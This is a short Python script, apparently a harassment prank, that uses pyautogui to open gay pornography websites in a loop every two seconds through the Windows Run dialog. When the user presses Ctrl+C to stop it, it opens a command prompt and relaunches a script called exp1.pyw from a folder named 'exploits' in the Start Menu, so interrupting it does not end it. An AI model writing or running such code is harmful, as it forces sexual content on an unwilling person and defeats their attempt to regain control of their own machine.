import pyautogui as pg; import time as tm
try:
    while True:
        pg.hotkey('win','r')
        pg.write('start https://es.pornhub.com/gay')
        pg.press('enter')
        pg.hotkey('win','r')
        pg.write('start https://es.xhamster.com/gay')
        pg.press('enter')
        tm.sleep(2)
except KeyboardInterrupt:
    pg.hotkey('win','r')
    pg.write('cmd')
    pg.press('enter')
    pg.write('C:')
    pg.press('enter')
    pg.write('cd "%UserProfile%\AppData\Roaming\Microsoft\Windows\Start Menu\exploits"')
    pg.press('enter')
    pg.write('python exp1.pyw')
    pg.press('enter')